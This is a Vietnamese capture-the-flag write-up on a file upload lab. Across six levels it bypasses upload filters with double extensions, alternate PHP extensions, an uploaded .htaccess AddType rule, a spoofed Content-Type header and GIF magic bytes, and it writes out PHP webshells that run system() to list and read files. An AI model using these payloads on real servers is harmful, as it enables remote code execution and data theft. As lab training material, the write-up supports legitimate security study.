# File Upload 
## Level 1

![](https://cdn.discordapp.com/attachments/1124588087931043891/1130054646661124096/image.png)

Debug source:
```php
$file = $dir . "/" . $_FILES["file"]["name"];
            move_uploaded_file($_FILES["file"]["tmp_name"], $file);
```

Ta thấy 2 dòng này không có đoạn filter nào. Do vậy chúng ta có thể upload 1 file .php có chứa mã để RCE.

Soạn và gửi 1 file mang tên test.php với nội dung sau:
```php
<?php phpinfo() ?>
```

Đi tới đường link chứa file test.php ta được:

![](https://cdn.discordapp.com/attachments/1124588087931043891/1130056496017850528/image.png) 

Vậy là ta thấy hàm `phpinfo()` được chạy thành công.

Ta nên test thử có RCE bằng hàm phpinfo() thay vì các hàm nguy hiểm như system(). Bởi rất có server chứa firewall, antivirus sẽ chặn không cho chạy các hàm nhạy cảm như vậy.

Soạn và gửi file test.php với nội dung sau để xem toàn bộ file và directory nằm ở thư mục root:
```php
<?php
system('ls / -la')
?>
```
Ta thấy chạy được system() và nó trả về toàn bộ file và directory nằm ở thư mục root này:

![](https://cdn.discordapp.com/attachments/1124588087931043891/1130057633529856131/image.png)

Flag nằm trong file secret.txt.
Tiếp tục soạn và gửi file test.php( sử dụng lệnh cat để mở file chỉ định):
```php
<?php
system('cat /secret.txt')
?>
```
Flag: CBJS{....}

## Level 2

Debug source:
```php
 $filename = $_FILES["file"]["name"];
            $extension = explode(".", $filename)[1];
            if ($extension === "php") {
                die("Hack detected");
            }
```
Dòng 2, hàm explode() đã giúp tách tên của file thành các phần khác nhau, các phần ngăn cách nhau bằng dấu "."

Kết quả trả về của hàm explode() là 1 array.

Nếu tên file là test.php thì nó sẽ tách thành 1 array như sau array["test", "php"], trong đó array[0] mang giá trị "test", array[1] mang giá trị "php".

Dòng 3, Kiểm tra xem array[1] có trùng giá trị với "php" không, nếu trùng thì Hack detected

Cách bypass của mình là mình sẽ để tên file là test.abc.php.

Dòng 2, đi qua hàm explode() thì nó sẽ thành array["test","abc","php"] và array[1] có giá trị "abc" !== "php". Vậy ta bypass thành công.

Soạn nội dung file test.abc.php như sau:

```php
<?php 
system('ls / -la')
?>
```

![](https://cdn.discordapp.com/attachments/1124588087931043891/1130057633529856131/image.png)

Flag nằm trong file secret.txt.
Tiếp tục soạn và gửi file test.abc.php( sử dụng lệnh cat để mở file chỉ định):
```php
<?php
system('cat /secret.txt')
?>
```
Flag: CBJS{....}


## Level 3


Debug source:

```php
$filename = $_FILES["file"]["name"];
            $extension = end(explode(".", $filename));
            if ($extension === "php") {
                die("Hack detected");
            }
```

Lần này có thêm hàm end() bọc bên ngoài explode() nên lúc này thì cái giá trị mà biến $extension trả về sẽ luôn là giá trị cuối của cái array mà mình phân tích phía trên.

Nghĩa là bạn đặt tên file là hack.abc.xyz.php thì cái $extension sẽ luôn trả về là php và bị phát hiện là hack.

Tuy nhiên mình biết được 1 file php không nhất thiết phải là .php mà có thể là các đuôi khác như .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc.

Đoạn này thử vài đuôi tệp thì mình thấy có 2 đuôi hợp lệ là .phar và .phtml. Thực hiện tương tự như level 1 nhưng đổi tên file thành hack.phar 



## Level 4

Lần này anh developer đã cho chúng ta xem luôn config của Apache nên chắc hẳn nó sẽ cho ta hint gì đó.

![](https://cdn.discordapp.com/attachments/1124588087931043891/1130203990815146095/image.png)

Đường dẫn "/var/www/" được đặt trong tag "Directory" để chỉ định thư mục mà các luật lệ trong phần cấu hình này sẽ được áp dụng.

Các luật lệ được khai báo bên trong tag "Directory" sẽ áp dụng cho thư mục được chỉ định bởi đường dẫn "/var/www/". Điều này có nghĩa là các thư mục và tệp tin trong thư mục "/var/www/" sẽ được xử lý theo các luật lệ này.

Điểm quan trọng nhất trong đoạn mã này là "AllowOverride All", nó cho phép các tệp tin .htaccess được sử dụng trong thư mục "/var/www/" để ghi đè cấu hình của Apache. Điều này có nghĩa là bạn có thể sử dụng các tệp tin .htaccess để chỉnh sửa cấu hình của Apache cho các thư mục và tệp tin trong thư mục "/var/www/".

Tạo một file .htaccess và tải lên với nội dung sau:
```http headers
AddType application/x-httpd-php .abc
```

Lúc này tất cả các file có đuôi là abc sẽ được execute dưới dạng file php.

Sau đó ta tạo một file test.abc với nội dung như sau và tải lên:
```php
<?php
system('ls / -la')
?>
```

Thực hiện tương tự như ở level 1 ta sẽ có flag.



## Level 5

Debug source:

```php
$mime_type = $_FILES["file"]["type"];
if (!in_array($mime_type, ["image/jpeg", "image/png", "image/gif"])) {
die("Hack detected");
}
```

Mã trên kiểm tra kiểu MIME của tệp được tải lên để đảm bảo rằng nó là một tệp ảnh JPEG, PNG hoặc GIF. Nếu kiểu MIME không thuộc danh sách này, thông báo "Hack detected" sẽ được hiển thị và kết thúc mã.

Ta dùng Burp để tải lên một file đuôi .php và đổi nội dung của header Content-Type trong Request thành image/jpeg và gửi đi:

`Content-Type: image/jpeg`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1130438858341896262/image.png)

Sau đó ta nhận được Response là:

![](https://cdn.discordapp.com/attachments/1124588087931043891/1130439607922728990/image.png)

Truy cập theo đường dẫn và làm tương tự như level 1 ta sẽ lụm được flag.



## Level 6

Debug source:

```php
 $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
            $whitelist = array("image/jpeg", "image/png", "image/gif");
            if (!in_array($mime_type, $whitelist, TRUE)) {
                die("Hack detected");
            }
```

Mã trên sử dụng thư viện fileinfo để xác định kiểu MIME của tệp được tải lên. Sau đó, nó kiểm tra xem kiểu MIME thuộc danh sách các kiểu MIME cho phép (JPEG, PNG, GIF) hay không. Nếu không, thông báo "Hack detected" sẽ được hiển thị và kết thúc mã.

Ta sẽ bypass bằng cách thêm magic type của GFI vào đầu file.
Ngoài Response Header Content-Type thì magic byte của file hình ảnh cũng được sử dụng để nhận định file type. Magic byte là chuỗi ký tự cố định được đặt vào đầu file để nhận diện file type. Ví dụ, magic byte của GIF, JPEG, PNG như sau:

![](https://cdn.discordapp.com/attachments/1124588087931043891/1130473823314137138/image.png)

Internet Explorer (7 trở về trước) sẽ tiến hành nhận diện file type như dưới đây trong thiết đặt mặc định.

- Trường hợp magic byte đồng nhất với Content-Type

Trường hợp này thì sử dụng file type hiển thị trong Content-Type.

- Trường hợp magic byte không đồng nhất với Content-Type

Trường hợp hiển thị file type mà magic byte và Content-Type khác nhau thì bỏ qua cả hai, thực hiện suy đoán file type từ nội dung của file. Cũng có trường hợp nếu tag HTML được bao gồm trong nội dung file thì nhận định là HTML. File PNG giả mạo đã giới thiệu ở [XSS bằng file hình ảnh] sẽ phù hợp trong trường hợp này. Trong file sample này không bao gồm magic byte hình ảnh, tuy nhiên dù có bao gồm magic byte nhưng lại mâu thuẫn với Content-Type thì cũng bị bỏ qua.

Tạo file test.php và upload với nội dung như sau
```php
GIF89a;//thay đổi định dang file thành image/gif
<?php
system('ls / -la')
?>
```

![](https://cdn.discordapp.com/attachments/1124588087931043891/1130057633529856131/image.png)

Flag nằm trong file secret.txt